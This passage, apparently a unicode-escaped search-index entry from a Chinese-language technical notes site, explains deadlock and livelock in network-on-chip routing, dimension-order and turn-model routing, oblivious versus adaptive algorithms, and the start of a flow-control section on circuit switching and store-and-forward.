<p>\u200b\u8def\u7531\u200b\u5728\u200b\u9009\u53d6\u200b\u7684\u200b\u65f6\u5019\u200b\u8fd8\u200b\u9700\u8981\u200b\u8003\u8651\u200b\u6b7b\u9501\u200b\u7684\u200b\u95ee\u9898\u200b\uff1a\u200b\u7531\u4e8e\u200b\u901a\u5e38\u200b\u7247\u4e0a\u200b\u7f51\u7edc\u200b\u662f\u200b\u4e0d\u200b\u5141\u8bb8\u200b\u4e22\u5305\u200b\u7684\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5982\u679c\u200b\u53d1\u9001\u6570\u636e\u200b\u65f6\u200b\uff0c\u200b\u63a5\u6536\u200b\u65b9\u200b\u7684\u200b\u7f13\u51b2\u533a\u200b\u5df2\u7ecf\u200b\u6ee1\u200b\u4e86\u200b\uff0c\u200b\u5c31\u200b\u4e0d\u80fd\u200b\u7ee7\u7eed\u200b\u53d1\u9001\u200b\u4e86\u200b\u3002\u200b\u90a3\u4e48\u200b\u8fd9\u4e2a\u200b\u65f6\u5019\u200b\u5c31\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u4e00\u4e2a\u200b\u4f9d\u8d56\u200b\u5173\u7cfb\u200b\uff1aA \u200b\u8981\u200b\u53d1\u7ed9\u200b B\uff0c\u200b\u4f46\u200b\u540c\u65f6\u200b B \u200b\u4e5f\u200b\u8981\u200b\u53d1\u7ed9\u200b C\uff0c\u200b\u73b0\u5728\u200b B \u200b\u548c\u200b C \u200b\u7684\u200b\u7f13\u51b2\u533a\u200b\u6ee1\u200b\u4e86\u200b\uff0c\u200b\u90a3\u4e48\u200b\u53ea\u6709\u200b\u7b49\u200b C \u200b\u7684\u200b\u7f13\u51b2\u533a\u200b\u91ca\u653e\u200b\u7a7a\u95f4\u200b\uff0cB \u200b\u624d\u80fd\u200b\u53d1\u7ed9\u200b C\uff0c\u200b\u7136\u540e\u200b B \u200b\u7684\u200b\u7f13\u51b2\u533a\u200b\u624d\u200b\u5f97\u4ee5\u200b\u91ca\u653e\u200b\uff0cA \u200b\u624d\u80fd\u200b\u53d1\u7ed9\u200b B\u3002\u200b\u6362\u53e5\u8bdd\u8bf4\u200b\uff0cA \u200b\u5230\u200b B \u200b\u7684\u200b\u4f20\u8f93\u200b\u53ea\u6709\u200b\u7b49\u200b B \u200b\u5230\u200b C \u200b\u7684\u200b\u4f20\u8f93\u200b\u5b8c\u6210\u200b\u624d\u200b\u53ef\u4ee5\u200b\u7ee7\u7eed\u200b\u3002</p> <p>\u200b\u90a3\u4e48\u200b\uff0c\u200b\u5047\u5982\u200b\u6b64\u65f6\u200b A \u200b\u5230\u200b B \u200b\u8981\u200b\u7b49\u5f85\u200b B \u200b\u5230\u200b C \u200b\u4f20\u8f93\u200b\u5b8c\u6210\u200b\uff0cB \u200b\u5230\u200b C \u200b\u8981\u200b\u7b49\u5f85\u200b C \u200b\u5230\u200b D \u200b\u4f20\u8f93\u200b\u5b8c\u6210\u200b\uff0cC \u200b\u5230\u200b D \u200b\u8981\u200b\u7b49\u5f85\u200b D \u200b\u5230\u200b A \u200b\u4f20\u8f93\u200b\u5b8c\u6210\u200b\uff0cD \u200b\u5230\u200b A \u200b\u8981\u200b\u7b49\u5f85\u200b A \u200b\u5230\u200b B \u200b\u4f20\u8f93\u200b\u5b8c\u6210\u200b\uff0c\u200b\u6b64\u65f6\u200b\u5c31\u200b\u51fa\u73b0\u200b\u4e86\u200b\u6b7b\u9501\u200b\uff1a\u200b\u4e92\u76f8\u200b\u4f9d\u8d56\u200b\uff0c\u200b\u51fa\u73b0\u200b\u4e86\u200b\u73af\u200b\uff0c\u200b\u5e76\u4e14\u200b\u6ca1\u6709\u200b\u529e\u6cd5\u200b\u4ece\u200b\u73af\u4e2d\u200b\u9000\u51fa\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u6b7b\u9501\u200b\u4e86\u200b\u3002</p> <p> </p> \u200b\u8def\u7531\u200b\u534f\u8bae\u200b\u6b7b\u9501\u200b\u7684\u200b\u60c5\u51b5\u200b\uff08\u200b\u56fe\u6e90\u200b On Chip Networks, Second Edition\uff09 <p>\u200b\u4e00\u4e2a\u200b\u7ecf\u5178\u200b\u7684\u200b\u8def\u7531\u200b\u7b97\u6cd5\u200b\u662f\u200b\u7ef4\u5e8f\u200b\u8def\u7531\u200b\uff08Dimension Ordering Routing\uff0c\u200b\u7b80\u79f0\u200b DOR\uff09\uff0c\u200b\u610f\u601d\u200b\u5c31\u662f\u200b\u6309\u7167\u200b\u7ef4\u5ea6\u200b\u7684\u200b\u987a\u5e8f\u200b\u53bb\u8def\u200b\u7531\u200b\uff0c\u200b\u53ea\u6709\u200b\u524d\u200b\u4e00\u4e2a\u200b\u7ef4\u5ea6\u200b\u8d70\u5230\u200b\u548c\u200b\u7ec8\u70b9\u200b\u76f8\u540c\u200b\uff0c\u200b\u624d\u200b\u4f1a\u200b\u5728\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u7ef4\u5ea6\u200b\u7ee7\u7eed\u200b\u8d70\u200b\u3002\u200b\u4f8b\u5982\u200b\u5728\u200b\u4e8c\u7ef4\u200b\u573a\u666f\u200b\u4e0b\u200b\uff0cX-Y \u200b\u8def\u7531\u200b\u5c31\u662f\u200b\u5148\u8d70\u200b X \u200b\u8f74\u200b\uff0c\u200b\u8d70\u200b\u5b8c\u200b X \u200b\u8f74\u200b\u4ee5\u540e\u200b\u518d\u200b\u8d70\u200b Y \u200b\u8f74\u200b\u3002\u200b\u53cd\u8fc7\u6765\u200b Y-X \u200b\u8def\u7531\u200b\u5219\u200b\u662f\u200b\u5148\u200b\u8d70\u200b Y \u200b\u8f74\u200b\uff0c\u200b\u518d\u200b\u8d70\u200b X \u200b\u8f74\u200b\u3002</p> <p>\u200b\u7ef4\u5e8f\u200b\u8def\u7531\u200b\u5341\u5206\u200b\u7b80\u5355\u200b\uff0c\u200b\u5bb9\u6613\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4e0d\u4f1a\u200b\u51fa\u73b0\u200b\u6b7b\u9501\u200b\u3002\u200b\u7ef4\u5e8f\u200b\u8def\u7531\u200b\u4e0d\u4f1a\u200b\u51fa\u73b0\u200b\u6b7b\u9501\u200b\u7684\u200b\u539f\u56e0\u200b\u662f\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u4f9d\u8d56\u200b\u4e0d\u4f1a\u200b\u51fa\u73b0\u200b\u73af\u200b\uff1a\u200b\u4ee5\u200b X-Y \u200b\u8def\u7531\u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u6240\u6709\u200b X \u200b\u65b9\u5411\u200b\u4e0a\u200b\u7684\u200b\u4f20\u8f93\u200b\u53ef\u80fd\u200b\u4f9d\u8d56\u200b Y \u200b\u65b9\u5411\u200b\u4e0a\u200b\u7684\u200b\u4f20\u8f93\u200b\uff0c\u200b\u4f46\u200b Y \u200b\u65b9\u5411\u200b\u4e0a\u200b\u7684\u200b\u4f20\u8f93\u200b\u4e0d\u4f1a\u200b\u4f9d\u8d56\u200b X \u200b\u65b9\u5411\u200b\u4e0a\u200b\u7684\u200b\u4f20\u8f93\u200b\u3002\u200b\u8fd8\u662f\u200b\u4ee5\u4e0a\u200b\u56fe\u4e3a\u200b\u4f8b\u5b50\u200b\uff1aA \u200b\u5230\u200b B \u200b\u7684\u200b\u4f20\u8f93\u200b\u4f9d\u8d56\u200b B \u200b\u5230\u200b C \u200b\u7684\u200b\u4f20\u8f93\u200b\uff0c\u200b\u4f46\u662f\u200b B \u200b\u5230\u200b C \u200b\u7684\u200b\u4f20\u8f93\u200b\u4e0d\u4f1a\u200b\u4f9d\u8d56\u200b C \u200b\u5230\u200b D \u200b\u7684\u200b\u4f20\u8f93\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u8fd9\u200b\u4e0d\u200b\u7b26\u5408\u200b X-Y \u200b\u8def\u7531\u200b\u7684\u200b\u89c4\u5219\u200b\u3002</p> <p>\u200b\u4f46\u662f\u200b\u7ef4\u5e8f\u200b\u8def\u7531\u200b\u7684\u200b\u7f3a\u70b9\u200b\u4e5f\u200b\u5f88\u200b\u660e\u663e\u200b\uff1a\u200b\u6d6a\u8d39\u200b\u4e86\u200b\u5f88\u591a\u200b\u53ef\u80fd\u200b\u7684\u200b\u8def\u5f84\u200b\uff0c\u200b\u4f8b\u5982\u200b A \u200b\u548c\u200b B \u200b\u540c\u65f6\u200b\u8981\u200b\u5411\u200b C \u200b\u4f20\u8f93\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u5728\u200b B \u200b\u5230\u200b C \u200b\u7684\u200b\u8fb9\u4e0a\u200b\u62e5\u6324\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u5229\u7528\u200b\u5269\u4e0b\u200b\u7684\u200b\u8def\u5f84\u200b\u3002</p> <p>\u200b\u63a5\u4e0b\u6765\u200b\u4ecb\u7ecd\u200b\u8def\u7531\u200b\u7b97\u6cd5\u200b\u7684\u200b\u4e24\u4e2a\u200b\u5206\u7c7b\u200b\uff1a\u200b\u4e00\u7c7b\u200b\u662f\u200b Oblivious \u200b\u8def\u7531\u200b\u7b97\u6cd5\u200b\uff0c\u200b\u53e6\u4e00\u7c7b\u200b\u662f\u200b Adaptive \u200b\u8def\u7531\u200b\u7b97\u6cd5\u200b\u3002\u200b\u987e\u540d\u601d\u4e49\u200b\uff0cOblivious \u200b\u4e0d\u200b\u8003\u8651\u200b\u7f51\u7edc\u200b\u5f53\u524d\u200b\u7684\u200b\u62e5\u585e\u200b\u72b6\u6001\u200b\uff0c\u200b\u76f4\u63a5\u200b\u6309\u7167\u200b\u81ea\u5df1\u200b\u7684\u200b\u7b97\u6cd5\u200b\u6765\u53d1\u200b\uff1bAdaptive \u200b\u4f1a\u200b\u6839\u636e\u200b\u7f51\u7edc\u200b\u5f53\u524d\u200b\u7684\u200b\u62e5\u585e\u200b\u72b6\u6001\u200b\uff0c\u200b\u671f\u671b\u200b\u627e\u5230\u200b\u4e00\u4e2a\u200b\u4e0d\u200b\u90a3\u4e48\u200b\u62e5\u6324\u200b\u7684\u200b\u8def\u5f84\u200b\u3002</p> <p>\u200b\u663e\u7136\u200b\uff0c\u200b\u7ef4\u5e8f\u200b\u8def\u7531\u200b\u6ca1\u6709\u200b\u8003\u8651\u200b\u7f51\u7edc\u200b\u662f\u5426\u200b\u62e5\u585e\u200b\uff0c\u200b\u5c5e\u4e8e\u200b Oblivious \u200b\u8def\u7531\u200b\u7b97\u6cd5\u200b\u3002\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u5178\u578b\u200b\u7684\u200b Oblivious \u200b\u8def\u7531\u200b\u662f\u200b Valiant \u200b\u968f\u673a\u200b\u8def\u7531\u200b\u7b97\u6cd5\u200b\uff1a\u200b\u968f\u673a\u200b\u9009\u62e9\u200b\u4e00\u4e2a\u200b\u4e2d\u95f4\u200b\u7ed3\u70b9\u200b\uff0c\u200b\u5148\u200b\u4ece\u200b\u8d77\u70b9\u200b\u8def\u7531\u200b\u5230\u200b\u4e2d\u95f4\u200b\u7ed3\u70b9\u200b\uff0c\u200b\u518d\u200b\u4ece\u200b\u4e2d\u95f4\u200b\u7ed3\u70b9\u200b\u8def\u7531\u200b\u5230\u200b\u7ec8\u70b9\u200b\u3002\u200b\u8fd8\u6709\u200b\u4e00\u79cd\u200b\u5178\u578b\u200b\u7684\u200b Oblivious \u200b\u8def\u7531\u200b\uff0c\u200b\u5c31\u662f\u200b\u968f\u673a\u200b\u9009\u62e9\u200b X-Y \u200b\u8def\u7531\u200b\u6216\u200b Y-X \u200b\u8def\u7531\u200b\u7684\u200b\u4e00\u79cd\u200b\uff0c\u200b\u4f46\u662f\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u6b7b\u9501\u200b\u3002</p> <p>Adaptive \u200b\u8def\u7531\u200b\u7b97\u6cd5\u200b\u7684\u200b\u76ee\u7684\u200b\u662f\u200b\uff0c\u200b\u6839\u636e\u200b\u7f51\u7edc\u200b\u7684\u200b\u62e5\u585e\u200b\u60c5\u51b5\u200b\uff0c\u200b\u627e\u5230\u200b\u4e00\u4e2a\u200b\u66f4\u4f18\u200b\u7684\u200b\u8def\u7531\u200b\uff0c\u200b\u7ed5\u8fc7\u200b\u62e5\u585e\u200b\u7684\u200b\u90e8\u5206\u200b\uff0c\u200b\u5b9e\u73b0\u200b\u66f4\u200b\u9ad8\u200b\u7684\u200b\u5e26\u5bbd\u200b\u5229\u7528\u7387\u200b\u3002\u200b\u4f8b\u5982\u200b\u5982\u679c\u200b\u6700\u77ed\u200b\u8def\u5f84\u200b\u4e0a\u200b\u51fa\u73b0\u200b\u4e86\u200b\u62e5\u585e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5c1d\u8bd5\u200b\u7ed5\u8def\u200b\uff0c\u200b\u5728\u200b\u4e00\u6761\u200b\u4e0d\u200b\u62e5\u585e\u200b\u7684\u200b\u6700\u200b\u77ed\u200b\u8def\u5f84\u200b\u4e0a\u200b\u4f20\u8f93\u200b\u3002\u200b\u4f46\u662f\u200b\u7ed5\u8def\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u9632\u6b62\u200b\u6d3b\u9501\u200b\uff1a\u200b\u4e00\u76f4\u200b\u5728\u200b\u7ed5\u8def\u200b\uff0c\u200b\u4ece\u6765\u200b\u6ca1\u200b\u5230\u8fbe\u200b\u76ee\u7684\u5730\u200b\u3002</p> <p>\u200b\u8bbe\u8ba1\u200b Adaptive \u200b\u8def\u7531\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e5f\u200b\u8981\u200b\u8003\u8651\u200b\u5982\u4f55\u200b\u907f\u514d\u200b\u6b7b\u9501\u200b\u3002\u200b\u7ef4\u5e8f\u200b\u8def\u7531\u200b\u4fdd\u8bc1\u200b\u4e86\u200b\u4e0d\u4f1a\u200b\u51fa\u73b0\u200b\u6b7b\u9501\u200b\uff0c\u200b\u4f46\u200b\u4e5f\u200b\u552f\u4e00\u200b\u786e\u5b9a\u200b\u4e86\u200b\u8def\u7531\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u652f\u6301\u200b Adaptive \u200b\u8def\u7531\u200b\u3002\u200b\u4f46\u200b\u5b9e\u9645\u4e0a\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u907f\u514d\u200b\u6b7b\u9501\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u50cf\u200b\u7ef4\u5e8f\u200b\u8def\u7531\u200b\u90a3\u4e48\u200b\u4e25\u683c\u200b\u3002</p> <p>\u200b\u56de\u987e\u200b\u4e00\u4e0b\u200b\u7ef4\u5e8f\u200b\u8def\u7531\u200b\u4e2d\u200b\u7684\u200b X-Y \u200b\u8def\u7531\u200b\uff1a\u200b\u5b83\u200b\u8981\u6c42\u200b\u5148\u8d70\u200b X \u200b\u8f74\u200b\uff0c\u200b\u518d\u200b\u8d70\u200b Y \u200b\u8f74\u200b\uff0c\u200b\u90a3\u4e48\u200b\u4ece\u200b X \u200b\u8f74\u200b\u62d0\u200b\u5230\u200b Y \u200b\u8f74\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6709\u200b\u56db\u79cd\u200b\u60c5\u51b5\u200b\uff0c\u200b\u89c1\u200b\u4e0b\u56fe\u200b (b)\uff1a</p> <p> </p> Mesh \u200b\u7684\u200b\u8f6c\u5411\u200b\uff08(a) \u200b\u662f\u200b\u6240\u6709\u200b\u53ef\u80fd\u200b\uff0c(b) \u200b\u662f\u200b X-Y \u200b\u8def\u7531\u200b\uff09\uff08\u200b\u56fe\u6e90\u200b On Chip Networks, Second Edition\uff09 <p>\u200b\u8fd9\u79cd\u200b\u62d0\u6cd5\u200b\u53ef\u4ee5\u200b\u4fdd\u8bc1\u200b\u4e0d\u200b\u51fa\u73b0\u200b\u6b7b\u9501\u200b\uff0c\u200b\u4f46\u662f\u200b\u6709\u200b\u66f4\u52a0\u200b\u5bbd\u677e\u200b\u7684\u200b\u8f6c\u5411\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4fdd\u8bc1\u200b\u4e0d\u200b\u51fa\u73b0\u200b\u6b7b\u9501\u200b\uff0c\u200b\u4f8b\u5982\u200b\u4e0b\u9762\u200b\u7684\u200b\u4e09\u79cd\u200b\uff1a</p> <p> </p> Mesh \u200b\u7684\u200b\u4e09\u79cd\u200b\u8f6c\u5411\u200b\u6a21\u578b\u200b\uff08\u200b\u56fe\u6e90\u200b On Chip Networks, Second Edition\uff09 <p>\u200b\u6bcf\u79cd\u200b\u8f6c\u5411\u200b\u6a21\u578b\u200b\u90fd\u200b\u5728\u200b\u516b\u79cd\u200b\u8f6c\u5411\u200b\u4e2d\u200b\u53bb\u6389\u200b\u4e86\u200b\u4e24\u79cd\u200b\uff0c\u200b\u8fd9\u6837\u200b\u5c31\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u65e0\u200b\u6b7b\u9501\u200b\u3002West First Turns \u200b\u7684\u200b\u610f\u601d\u200b\u662f\u200b\u5148\u5f80\u200b\u897f\u200b\u8d70\u200b\uff0c\u200b\u8f6c\u5411\u200b\u540e\u200b\u4e0d\u518d\u200b\u5f80\u897f\u200b\u8d70\u200b\uff1bNorth Last Turns \u200b\u7684\u200b\u610f\u601d\u200b\u662f\u200b\u5f80\u5317\u8d70\u200b\u53ea\u80fd\u200b\u51fa\u73b0\u200b\u5728\u200b\u6700\u540e\u200b\u9636\u6bb5\u200b\uff0c\u200b\u5f80\u5317\u8d70\u200b\u4ee5\u540e\u200b\u5c31\u200b\u4e0d\u518d\u200b\u8f6c\u5411\u200b\uff1bNegative First Turns \u200b\u7684\u200b\u610f\u601d\u200b\u662f\u200b\u5148\u5f80\u200b\u897f\u200b\uff08X \u200b\u8f74\u8d1f\u200b\u65b9\u5411\u200b\uff09\u200b\u6216\u8005\u200b\u5357\u200b\uff08Y \u200b\u8f74\u8d1f\u200b\u65b9\u5411\u200b\uff09\u200b\u8d70\u200b\uff0c\u200b\u4e4b\u540e\u200b\u518d\u200b\u5f80\u4e1c\u200b\uff08X \u200b\u8f74\u6b63\u200b\u65b9\u5411\u200b\uff09\u200b\u6216\u8005\u200b\u5317\u200b\uff08Y \u200b\u8f74\u6b63\u200b\u65b9\u5411\u200b\uff09\u200b\u8d70\u200b\u3002</p> <p>\u200b\u8fd8\u6709\u200b\u4e00\u79cd\u200b Odd-even \u200b\u65b9\u6cd5\u200b\uff1a\u200b\u5728\u200b\u5076\u6570\u200b\u5217\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7981\u6b62\u200b\u4e1c\u8f6c\u200b\u5317\u548c\u5317\u200b\u8f6c\u897f\u200b\uff1b\u200b\u5728\u200b\u5947\u6570\u200b\u5217\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7981\u6b62\u200b\u4e1c\u8f6c\u200b\u5357\u548c\u5357\u200b\u8f6c\u897f\u200b\u3002</p> <p>\u200b\u6709\u200b\u4e86\u200b\u66f4\u200b\u591a\u200b\u8f6c\u5411\u200b\u65b9\u5411\u200b\u540e\u200b\uff0c\u200b\u5c31\u200b\u5141\u8bb8\u200b\u51fa\u73b0\u200b\u591a\u79cd\u200b\u53ef\u80fd\u200b\u7684\u200b\u8def\u5f84\u200b\uff0c\u200b\u610f\u5473\u7740\u200b Adaptive \u200b\u8def\u7531\u200b\u7b97\u6cd5\u200b\u53ef\u4ee5\u200b\u5728\u200b\u4fdd\u8bc1\u200b\u4e0d\u200b\u6b7b\u9501\u200b\u7684\u200b\u524d\u63d0\u200b\u4e0b\u200b\uff0c\u200b\u627e\u51fa\u200b\u4e00\u6761\u200b\u6bd4\u8f83\u200b\u4f18\u7684\u200b\u8def\u5f84\u200b\u3002</p> <p>\u200b\u5728\u200b\u4e0b\u200b\u4e00\u8282\u200b\u4f1a\u200b\u4ecb\u7ecd\u200b\u5982\u4f55\u200b\u7528\u6d41\u200b\u63a7\u6765\u200b\u4fdd\u8bc1\u200b\u4e0d\u4f1a\u200b\u51fa\u73b0\u200b\u6b7b\u9501\u200b\uff0c\u200b\u6b64\u65f6\u200b\u8def\u7531\u200b\u5c31\u200b\u4e0d\u200b\u9700\u8981\u200b\u4fdd\u8bc1\u200b\u4e0d\u200b\u51fa\u73b0\u200b\u6b7b\u9501\u200b\u4e86\u200b\uff0c\u200b\u8fd9\u6837\u200b\u53ef\u4ee5\u200b\u83b7\u5f97\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u7075\u6d3b\u6027\u200b\u3002</p>"},{"location":"hardware/on_chip_networks.html#_5","title":"\u6d41\u63a7","text":"<p>\u200b\u786e\u5b9a\u200b\u597d\u200b\u8def\u7531\u200b\u4ee5\u540e\u200b\uff0c\u200b\u8fd8\u200b\u9700\u8981\u200b\u8003\u8651\u200b\u6d41\u91cf\u200b\u63a7\u5236\u200b\u7684\u200b\u95ee\u9898\u200b\uff1a\u200b\u5f53\u200b\u94fe\u8def\u200b\u51fa\u73b0\u200b\u62e5\u585e\u200b\uff0c\u200b\u5982\u4f55\u200b\u4fdd\u8bc1\u200b\u9ad8\u6548\u200b\u7684\u200b\u4f20\u8f93\u200b\u3002</p> <p>\u200b\u5728\u200b\u5b9e\u73b0\u200b\u6d41\u63a7\u200b\u4e4b\u524d\u200b\uff0c\u200b\u9700\u8981\u200b\u5148\u200b\u4e86\u89e3\u200b\u5728\u200b\u7247\u200b\u4e0a\u200b\u7f51\u7edc\u200b\u4e0a\u200b\u4f20\u8f93\u200b\u7684\u200b\u662f\u200b\u4ec0\u4e48\u200b\u6570\u636e\u200b\uff0c\u200b\u53c8\u200b\u662f\u200b\u600e\u4e48\u200b\u4f20\u8f93\u6570\u636e\u200b\u7684\u200b\u3002</p> <p>\u200b\u9996\u5148\u200b\uff0c\u200b\u7ed3\u70b9\u200b\u8981\u200b\u53d1\u9001\u200b\u7684\u200b\u662f\u200b\u6d88\u606f\u200b\uff08Message\uff09\uff0c\u200b\u4f8b\u5982\u200b\u8981\u200b\u8bfb\u5199\u200b\u5185\u5b58\u200b\uff0c\u200b\u5b9e\u73b0\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b\u7b49\u7b49\u200b\u3002\u200b\u5bf9\u4e8e\u200b\u4e0a\u5c42\u200b\u6765\u8bf4\u200b\uff0c\u200b\u5b83\u200b\u6536\u53d1\u200b\u7684\u200b\u90fd\u200b\u662f\u200b\u6d88\u606f\u200b\uff0c\u200b\u628a\u200b\u6d88\u606f\u200b\u4ea4\u7ed9\u200b\u7247\u4e0a\u200b\u7f51\u7edc\u200b\u4ee5\u540e\u200b\uff0c\u200b\u7531\u7247\u200b\u4e0a\u200b\u7f51\u7edc\u200b\u8d1f\u8d23\u200b\u4f20\u8f93\u200b\u5230\u200b\u76ee\u7684\u5730\u200b\uff0c\u200b\u800c\u200b\u4e0d\u200b\u9700\u8981\u200b\u8003\u8651\u200b\u7247\u4e0a\u200b\u7f51\u7edc\u200b\u662f\u200b\u5177\u4f53\u200b\u600e\u4e48\u200b\u5b9e\u73b0\u200b\u7684\u200b\u3002\u200b\u5982\u679c\u200b\u62ff\u200b\u7f51\u7edc\u200b\u6765\u200b\u7c7b\u6bd4\u200b\uff0c\u200b\u5c31\u200b\u50cf\u662f\u200b\u5728\u200b\u4e00\u4e2a\u200b\u53ef\u9760\u200b\u7684\u200b UDP \u200b\u534f\u8bae\u200b\u4e0a\u200b\u4f20\u8f93\u200b\u6d88\u606f\u200b\u3002</p> <p>\u200b\u6b63\u5982\u200b IP \u200b\u6709\u200b\u6700\u5927\u200b\u957f\u5ea6\u200b\uff0c\u200b\u9700\u8981\u200b\u8fdb\u884c\u200b\u5206\u7247\u200b\uff0c\u200b\u7247\u4e0a\u200b\u7f51\u7edc\u200b\u4e5f\u200b\u6709\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u673a\u5236\u200b\uff0c\u200b\u5c31\u662f\u200b\u628a\u200b\u6d88\u606f\u200b\u62c6\u6210\u200b\u5f88\u591a\u200b\u4e2a\u200b Packet\uff0cPacket \u200b\u6709\u200b\u6700\u5927\u200b\u957f\u5ea6\u200b\u3002\u200b\u4ece\u200b Message \u200b\u5230\u200b Packet \u200b\u9664\u4e86\u200b\u5206\u7247\u200b\u4ee5\u5916\u200b\uff0c\u200b\u53ef\u80fd\u200b\u8fd8\u200b\u6d89\u53ca\u200b\u5230\u200b\u5730\u5740\u200b\u7684\u200b\u8f6c\u6362\u200b\uff1a\u200b\u4f8b\u5982\u200b\u6839\u636e\u200b\u8bfb\u53d6\u200b\u5185\u5b58\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u627e\u5230\u200b\u5730\u5740\u200b\u6240\u200b\u5bf9\u5e94\u200b\u7684\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\uff0c\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\u5728\u200b\u7247\u200b\u4e0a\u200b\u7f51\u7edc\u200b\u7684\u200b\u5750\u6807\u200b\uff0c\u200b\u7136\u540e\u200b\u586b\u200b\u5230\u200b Packet \u200b\u7684\u200b\u5934\u90e8\u200b\u4e0a\u200b\u3002\u200b\u5230\u200b Packet \u200b\u8fd9\u200b\u4e00\u5c42\u200b\u4e4b\u540e\u200b\uff0c\u200b\u5c31\u662f\u200b\u7528\u7247\u200b\u4e0a\u200b\u7f51\u7edc\u200b\u7684\u200b\u903b\u8f91\u200b\u6765\u200b\u5904\u7406\u200b\u4e86\u200b\uff0c\u200b\u4e0a\u5c42\u200b\u7684\u200b Message \u200b\u4ec5\u4ec5\u200b\u662f\u200b\u8f7d\u8377\u200b\u3002\u200b\u5f53\u200b Packet \u200b\u5230\u8fbe\u200b\u76ee\u7684\u5730\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5219\u200b\u8981\u200b\u91cd\u65b0\u200b\u7ec4\u88c5\u200b\u6210\u200b Message \u200b\u4ea4\u7ed9\u200b\u4e0a\u5c42\u200b\u903b\u8f91\u200b\u3002</p> <p>\u200b\u7b2c\u4e00\u4e2a\u200b\u6d41\u63a7\u200b\u65b9\u6cd5\u200b\u662f\u200b\u7535\u8def\u200b\u4ea4\u6362\u200b\uff08Circuit Switching\uff09\uff1a\u200b\u5148\u200b\u521d\u59cb\u5316\u200b\u4e00\u4e2a\u200b\u4ece\u200b\u8d77\u70b9\u200b\u5230\u200b\u7ec8\u70b9\u200b\u7684\u200b\u94fe\u8def\u200b\uff0c\u200b\u521d\u59cb\u5316\u200b\u597d\u200b\u4ee5\u540e\u200b\u624d\u200b\u5f00\u59cb\u200b\u53d1\u9001\u6570\u636e\u200b\uff0c\u200b\u6b64\u65f6\u200b\u6570\u636e\u200b\u4e0d\u200b\u9700\u8981\u200b\u5206\u7247\u200b\uff0c\u200b\u76f4\u63a5\u200b\u53d1\u9001\u200b\u3002\u200b\u94fe\u8def\u200b\u5efa\u7acb\u200b\u4ee5\u540e\u200b\uff0c\u200b\u94fe\u8def\u200b\u4e0a\u200b\u7684\u200b\u7ed3\u70b9\u200b\u53ea\u200b\u8d1f\u8d23\u200b\u4f20\u8f93\u200b\u8fd9\u200b\u4e00\u4e2a\u200b\u94fe\u8def\u200b\u4e0a\u200b\u7684\u200b\u6d88\u606f\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5982\u679c\u200b\u4f20\u8f93\u200b\u7684\u200b\u6570\u636e\u200b\u5360\u200b\u4e0d\u6ee1\u200b\u94fe\u8def\u200b\u7684\u200b\u5e26\u5bbd\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u6d6a\u8d39\u200b\u3002\u200b\u4f46\u662f\u200b\u4f20\u8f93\u6570\u636e\u200b\u7684\u200b\u6548\u7387\u200b\u6bd4\u8f83\u200b\u9ad8\u200b\uff1a\u200b\u6ca1\u6709\u200b\u5206\u7247\u200b\u7684\u200b\u5f00\u9500\u200b\uff0c\u200b\u5982\u679c\u200b\u4f20\u8f93\u200b\u7684\u200b\u6570\u636e\u91cf\u200b\u5927\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5206\u644a\u200b\u5efa\u7acb\u200b\u9636\u6bb5\u200b\u7684\u200b\u5f00\u9500\u200b\u3002</p> <p>\u200b\u7b2c\u4e8c\u4e2a\u200b\u6d41\u63a7\u200b\u65b9\u6cd5\u200b\u662f\u200b\u5b58\u50a8\u8f6c\u53d1\u200b\uff08Store and Forward\uff09\uff1a\u200b\u628a\u200b\u6536\u5230\u200b\u7684\u200b Packet \u200b\u4fdd\u5b58\u200b\u4e0b\u6765\u200b\uff0c\u200b\u7136\u540e\u200b\u6839\u636e\u200b\u6bcf\u4e2a\u200b Packet 